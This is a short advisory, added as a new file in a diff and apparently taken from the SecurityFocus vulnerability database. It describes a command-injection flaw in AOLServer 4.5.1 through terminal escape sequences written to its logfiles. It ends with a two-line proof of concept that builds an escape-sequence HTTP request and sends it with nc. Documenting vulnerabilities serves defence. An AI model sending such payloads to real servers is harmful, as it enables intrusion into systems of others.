@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/37712/info
+
+AOLServer is prone to a command-injection vulnerability because it fails to adequately sanitize user-supplied input in logfiles.
+
+Attackers can exploit this issue to execute arbitrary commands in a terminal.
+
+AOLServer 4.5.1 is vulnerable; other versions may also be affected.
+
+The following example is available:
+
+echo -en "GET /\x1b]2;owned?\x07\x0a\x0d\x0a\x0d" > payload
+nc www.example.com 80 < payload
+
